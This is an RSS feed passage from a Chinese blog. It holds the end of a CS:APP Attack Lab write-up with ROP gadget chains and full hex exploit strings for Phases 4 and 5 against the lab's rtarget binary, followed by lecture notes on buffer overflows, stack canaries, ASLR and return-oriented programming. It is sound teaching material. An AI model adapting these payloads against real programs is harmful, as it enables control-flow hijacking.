   0x0000000000401a7c &amp;lt;setval_450+0&amp;gt;:   c7 07 09 ce 08 c9       movl   $0xc908ce09,(%rdi)
   0x0000000000401a82 &amp;lt;setval_450+6&amp;gt;:   c3                      ret
   0x0000000000401a83 &amp;lt;addval_358+0&amp;gt;:   8d 87 08 89 e0 90       lea    -0x6f1f76f8(%rdi),%eax
   0x0000000000401a89 &amp;lt;addval_358+6&amp;gt;:   c3                      ret
   0x0000000000401a8a &amp;lt;addval_124+0&amp;gt;:   8d 87 89 c2 c7 3c       lea    0x3cc7c289(%rdi),%eax
   0x0000000000401a90 &amp;lt;addval_124+6&amp;gt;:   c3                      ret
   0x0000000000401a91 &amp;lt;getval_169+0&amp;gt;:   b8 88 ce 20 c0          mov    $0xc020ce88,%eax
   0x0000000000401a96 &amp;lt;getval_169+5&amp;gt;:   c3                      ret
   0x0000000000401a97 &amp;lt;setval_181+0&amp;gt;:   c7 07 48 89 e0 c2       movl   $0xc2e08948,(%rdi)
   0x0000000000401a9d &amp;lt;setval_181+6&amp;gt;:   c3                      ret
   0x0000000000401a9e &amp;lt;addval_184+0&amp;gt;:   8d 87 89 c2 60 d2       lea    -0x2d9f3d77(%rdi),%eax
   0x0000000000401aa4 &amp;lt;addval_184+6&amp;gt;:   c3                      ret
   0x0000000000401aa5 &amp;lt;getval_472+0&amp;gt;:   b8 8d ce 20 d2          mov    $0xd220ce8d,%eax
   0x0000000000401aaa &amp;lt;getval_472+5&amp;gt;:   c3                      ret
   0x0000000000401aab &amp;lt;setval_350+0&amp;gt;:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)
   0x0000000000401ab1 &amp;lt;setval_350+6&amp;gt;:   c3                      ret
   0x0000000000401ab2 &amp;lt;end_farm+0&amp;gt;:     b8 01 00 00 00          mov    $0x1,%eax
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者,利用提供的farm.c文件:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -c farm.c
objdump -d farm.o &amp;gt; farm.s
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到的farm.s文件与以上gdb结果理论上应该相同,但是我发现不同,farm.s每个函数都多了 &lt;code&gt;push&lt;/code&gt;,&lt;code&gt;pop&lt;/code&gt;这些操作,这是 [[机器级编程III(过程Procedure)#寄存器保存约定|被调用者保存的约定]] ,我猜这是编译器优化行为并且认为应该采用gdb中的结果.将以上gdb反汇编结果保存为farm.d,熟练使用vim查找功能抽取指令.&lt;/p&gt;
&lt;h2&gt;Phase 4&lt;/h2&gt;
&lt;p&gt;Handout中提示我,这个问题使用两个gadget和 &lt;code&gt;pop&lt;/code&gt; 指令,注入的字符串包括数据部分.既然使用两个gadget,那就需要用到 &lt;code&gt;test&lt;/code&gt;函数以及调用&lt;code&gt;test&lt;/code&gt;函数的栈帧.在gdb中&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;b test
layout asm 
layout regs
r -q
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以发现 &lt;code&gt;test&lt;/code&gt;函数的栈帧为8字节,其上的0x402044似乎为另一个函数的地址.一看果然
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250125163221.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;结合ctarget中对 &lt;code&gt;getbuf&lt;/code&gt;函数的认识,我可以画出获取输入时栈的情况:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;栈空间&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(launch函数栈帧)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x402044 &amp;lt;launch+112&amp;gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(test函数栈帧)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;8字节&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x401976 &amp;lt;test+14&amp;gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(getbuff函数栈帧)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;40字节buffer&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;最直接的解法思路自然就是&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;栈空间&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;填充&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(launch函数栈帧)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4017ec&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;return address&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(test函数栈帧)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;8字节&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;cookie&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;&lt;code&gt;5f c3&lt;/code&gt;所在的地址&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(getbuff函数栈帧)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;40字节buffer&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;填充任意字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;其中&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;pre&gt;&lt;code&gt;gadget 1:
	pop    %rdi
	ret

return address:
	0x4017ec &amp;lt;touch2&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;gadget address1 对应的字节指令是&lt;code&gt;5f c3&lt;/code&gt;,但是在farm.d中找不到,只好借助中间变量
注意到&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x00000000004019a7 &amp;lt;addval_219+0&amp;gt;:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
# 58 90 c3 :	pop		%rax;ret
0x00000000004019a0 &amp;lt;addval_273+0&amp;gt;:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
# 48 89 c7 c3 :		movq	%rax,%rdi;ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以gadget应该设计为:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gadget 1:
	pop    %rax
	ret

gedget 2:
	movq    %rax,%rdi
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;相应地,栈空间应该设计为:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;栈空间&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;填充&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(launch函数栈帧)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4017ec&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;touch2 address&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4019a2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(test函数栈帧)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;8字节&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;cookie&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4019ab&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(getbuff函数栈帧)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;40字节buffer&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;填充任意字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;根据以上设计,填充的字符串为&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;pre&gt;&lt;code&gt;/* Phase4 */
ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff ff ff 
/* 以上40字节 */
ab 19 40 00 00 00 00 00 /* gadget address 1 */
fa 97 b9 59 00 00 00 00 /* cookie: 59b997fa */
a2 19 40 00 00 00 00 00 /* gadget address 2 */
ec 17 40 00 00 00 00 00 /* touch2 address */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功了!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ ./rtarget -qi Phase4-raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;执行返回地址的时候栈顶指针已经在这块8字节地址内存的上方了.
遇到&lt;code&gt;ret&lt;/code&gt;指令时,实质是将此时的栈顶指针上方当作返回地址取出并跳转.&lt;/p&gt;
&lt;h2&gt;Phase 5&lt;/h2&gt;
&lt;p&gt;根据Handout的提示,可能需要用到8个gadget
注意到&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	0x0000000000401a03 &amp;lt;addval_190+0&amp;gt;:   8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax
# 48 89 e0 c3:  movq     %rsp,%rax;ret
	0x00000000004019a0 &amp;lt;addval_273+0&amp;gt;:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
# 48 89 c7 c3 :     movq    %rax,%rdi;ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如何在栈空间中连续存放字符串呢?我注意到farm.c文件中有一个 &lt;code&gt;add_xy&lt;/code&gt;函数:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;long add_xy(long x, long y)  
{  
    return x+y;  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;利用这个函数来计算字符串存放的位置相对于%rsp的偏移量
设计gadget:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gadget 1:    # 0x401a06
	movq    %rsp,%rax
	ret

gadget 2:    # 0x4019a2
	movq    %rax,%rdi
	ret
# 以上,将%rsp处的值复制给了%rdi

gadget 3:    # 0x4019ab
	pop    %rax
	ret

gadget 4:    # 0x4019dd
	movl    %eax,%edx
	ret

gadget 5:    # 0x401a34
	cmpb    %cl,cl
	movl    %edx,%ecx
	ret

gadget 6:    # 0x401a13
	movl    %ecx,%esi
# 以上,将偏移量传给%esi.我本来是要相减的,但突然想起来movl会将高位全部设置成0,行不通了,只能向上方偏移.

gadget 7:    # 0x4019d6
	lea    (%rdi,%rsi,1),%rax
	ret

gadget 8:    # 0x4019a2
	movq    %rax,%rdi
	ret
# 以上,将字符串指针传递给%rdi
 touch3 address:0x4018fa
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;覆写 &lt;code&gt;getbuf&lt;/code&gt;函数的返回地址为gadget address 1,之上为gadget address 2,以此类推,
栈空间应该为&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;栈空间&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;填充&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;备注&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(launch函数栈帧)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x35 0x39...&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;cookie string&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4018fa&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;touch3 address&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4019a2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 8&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4019d6&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 7&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x401a13&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 6&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x401a34&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 5&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4019dd&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 4&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x48&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0x48&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;偏移量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4019ab&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 3&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4019a2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;执行gadget 1时的%rsp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(test函数栈帧)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x401a06&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 1&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(getbuff函数栈帧)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;40字节buffer&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;任意填充字符&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;根据以上设计,填充的字符串为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* Phase5 */
ff ff ff ff ff ff ff ff ff ff                               
ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff ff ff    
ff ff ff ff ff ff ff ff ff ff
/* 以上共40字节 */
06 1a 40 00 00 00 00 00 /* gadget address 1 */
a2 19 40 00 00 00 00 00 /* gadget address 2 */
ab 19 40 00 00 00 00 00 /* gadget address 3 */
48 00 00 00 00 00 00 00 /* 偏移量:8*9 */
dd 19 40 00 00 00 00 00 /* gadget address 4 */
34 1a 40 00 00 00 00 00 /* gadget address 5 */
13 1a 40 00 00 00 00 00 /* gadget address 6 */
d6 19 40 00 00 00 00 00 /* gadget address 7 */
a2 19 40 00 00 00 00 00 /* gadget address 8 */
fa 18 40 00 00 00 00 00 /* touch3 address */
35 39 62 39 39 37 66 61 00          /* cookie:59b997fa */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;大功告成!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ ./rtarget -qi Phase5-raw
Cookie: 0x59b997fa
Touch3!: You called touch3(&amp;quot;59b997fa&amp;quot;)
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;总结&lt;/h1&gt;
&lt;p&gt;我看网上不少名校的学生都焦头烂额的实验,我独立完成,真是天才如我.只觉得CTF的什么逆向,pwn,也不过如此.&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Thu, 23 Jan 2025 16:00:00 GMT</pubDate></item><item><title>机器级编程V(进阶)</title><link>https://tankimzeg.top/blog/csapp/machine-level-programming-v/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/machine-level-programming-v/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/machine-level-programming-v/&quot;&gt;https://tankimzeg.top/blog/csapp/machine-level-programming-v/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;x86-64 Linux内存排列&lt;/h1&gt;
&lt;p&gt;虽然64位机器可以访问2^ 64的地址,但是这远远超过了目前的硬件水平.实际上现在64位机器会限制只是用47位的地址.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250123162831.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;栈(Stack):最大8MB,用 &lt;code&gt;ulimit -a&lt;/code&gt;命令可以查看&lt;/li&gt;
&lt;li&gt;堆(Heap):调用alloc()函数时动态分配&lt;/li&gt;
&lt;li&gt;数据(Data):固定分配的数据,全局变量&lt;/li&gt;
&lt;li&gt;共享库(Share Libraries)/文本(Text):可执行的机器指令,只读.程序执行时会&lt;strong&gt;动态加载&lt;/strong&gt;库函数&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;char big_array[1L&amp;lt;&amp;lt;24]; /* 16 MB */ 
char huge_array[1L&amp;lt;&amp;lt;31]; /* 2 GB */ 
int global = 0; 

int useless() { return 0; } 
int main () { 
	void *p1, *p2, *p3, *p4; 
	int local = 0; 
	p1 = malloc(1L &amp;lt;&amp;lt; 28); /* 256 MB */ 
	p2 = malloc(1L &amp;lt;&amp;lt; 8); /* 256 B */ 
	p3 = malloc(1L &amp;lt;&amp;lt; 32); /* 4 GB */ 
	p4 = malloc(1L &amp;lt;&amp;lt; 8); /* 256 B */ 
	/* Some print statements ... */ 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当运行这个程序时,可以观察到
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250123163815.png&quot; alt=&quot;&quot;&gt;
小的数组地址低,大的数组地址高.中间的区域即使还未被分配,依然视为堆的一部分,引用它会产生 Segmentation Fault.
如果上下两块相遇,alloc函数再也无法分配内存,就会分配失败返回空指针.
所以我们能够对哪些内存对应程序的哪一部分有一个大概的印象,在做bomblab实验时,我也注意到,0x7fff...是栈空间,0x40...是函数体,0x60...是一些变量.&lt;/p&gt;
&lt;h1&gt;缓冲区溢出&lt;/h1&gt;
&lt;p&gt;在学习C语言的过程中我已经了解到有一些处理字符串的函数是不安全的,没有边界检查.比如 &lt;code&gt;gets()&lt;/code&gt;  &lt;code&gt;*scanf()&lt;/code&gt; &lt;code&gt;strcat()&lt;/code&gt; 函数等等.&lt;/p&gt;
&lt;p&gt;这里有一个不安全的函数:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void echo() { 
	char buf[4]; /* Way too small! */ 
	gets(buf); 
	puts(buf); 
}

void call_echo(){
	echo();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个函数智能存储3个字符的字符串.不过实际上输入大于3个时也不会立即崩溃,要看编译器生成的汇编代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;echo:
	sub    $0x18, %rsp
	mov    %rsp, %rdi
	callq  &amp;lt;gets&amp;gt;
	mov    %rsp, %rdi
	callq  &amp;lt;puts&amp;gt;
	add    $0x18, %rsp
	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以编译器实际上给栈分配了24字节的空间,能够容纳长度23的字符串.一旦字符串多于23个字符,就会把&lt;code&gt;call_echo&lt;/code&gt;函数栈帧的返回地址覆盖掉.当 &lt;code&gt;echo()&lt;/code&gt;函数执行完毕后,跳转到返回地址就到别的地方去了,从而引发无法预料的行为,程序崩溃.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250123170310.png&quot; alt=&quot;&quot;&gt; =&amp;gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250123170512.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;代码注入攻击&lt;/h2&gt;
&lt;p&gt;利用这个缓冲区溢出的漏洞,可以进行代码注入攻击&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;输入字符串包括转换成字节形式的指令&lt;/li&gt;
&lt;li&gt;覆盖返回地址,使其指向注入的代码
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250123171356.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;避免缓冲区溢出攻击&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;在代码层面增强健壮性
避免使用不安全的函数:&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;用 &lt;code&gt;fgets()&lt;/code&gt; 替代 &lt;code&gt;gets()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;strncpy()&lt;/code&gt; 替代 &lt;code&gt;strcpy()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在 &lt;code&gt;*scanf()&lt;/code&gt;的&lt;code&gt;%s&lt;/code&gt;前加上数字限制最大读取长度&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;系统级保护&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;栈随机化(ASLR:Address Space Layout Randomization)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;程序开始时,在栈上分配一个随机大小的空间&lt;/li&gt;
&lt;li&gt;整个程序的栈地址随之偏移&lt;/li&gt;
&lt;li&gt;攻击者更难构造返回地址
  &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250123172651.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;不可执行代码标记
  通过将堆栈标记为&lt;strong&gt;不可执行的&lt;/strong&gt;,能够避免这种攻击方式&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;金丝雀(Canary)保护机制
Bomblab的[[Bomblab#phase_5|phase_5]]中出现过
在gcc中添加编译选项
&lt;code&gt;gcc&lt;/code&gt;
&lt;code&gt; -fstack-protector&lt;/code&gt;: 启用保护,只为局部变量中含有char数组的函数插入保护(默认开启)
&lt;code&gt; -fstack-protector-all&lt;/code&gt;: 启用保护,为所有函数插入保护代码
&lt;code&gt; -fno-stack-protector&lt;/code&gt;: 禁用保护
加入了栈保护后&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86-64asm&quot;&gt;echo:
	sub    $0x18, %rsp

	mov    %fs:0x28, %rax
	mov    %rax, 0x8(%rsp)

	mov    %rsp, %rdi
	callq  &amp;lt;gets&amp;gt;
	mov    %rsp, %rdi
	callq  &amp;lt;puts&amp;gt;

	mov    0x8(%rsp), %rax
	xor    %fs:0x28, %rax
	je     .notoverflow
	callq  &amp;lt;__stack_chk_fail@plt&amp;gt;
	
.notoverflow:
	add    $0x18, %rsp
	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样,程序将一个随机的cookies放在了%rsp+8的地址上,如果输入的字符串长度大于等于8,覆盖到了这个随机数,程序返回之前的检查就不能通过.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250123175437.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;面向返回的编程攻击(Return-Oriented Programming Attack)&lt;/h2&gt;
&lt;p&gt;系统级保护(栈随机化/不可知性标记)给攻击提升了难度,但是现有代码/库函数是可执行的.
ROP利用现有代码,需要栈溢出漏洞,没有克服canary保护&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这一部分有些难理解&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我目前暂时的理解(不一定正确,需要去做Attacklab进一步学习)是,通过栈溢出覆盖了多个返回地址,每个返回地址指向了攻击者抽取的gadget.一系列gadget都以ret结尾,使得gadget能够连成指令序列.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250123185428.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;抽取gadget构建程序:指令序列以 &lt;code&gt;ret&lt;/code&gt; 终止(0xc3)&lt;ul&gt;
&lt;li&gt;现有函数的结尾&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;4004d0 &amp;lt;ab_plus_c&amp;gt;:
	4004d0:    48 0f af fe
	4004d4:    48 8d 04 17
	4004d8:    c3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果gadget地址取0x4004d4,会执行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	lea    (%rdi,%rdx,1), %rax
	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这就是含有一定功能和ret的gadget.
	- 任何二进制片段&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;&amp;lt;setval&amp;gt;:
	4004d9:    c7 07 d4 48 89 c7
	4004df:    c3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果gadget地址取0x4004dc,刚好截取&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	movl    %rax, %rdi
	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这就是含有一定功能和ret的gadget.&lt;/p&gt;
&lt;h1&gt;联合体(Union)&lt;/h1&gt;
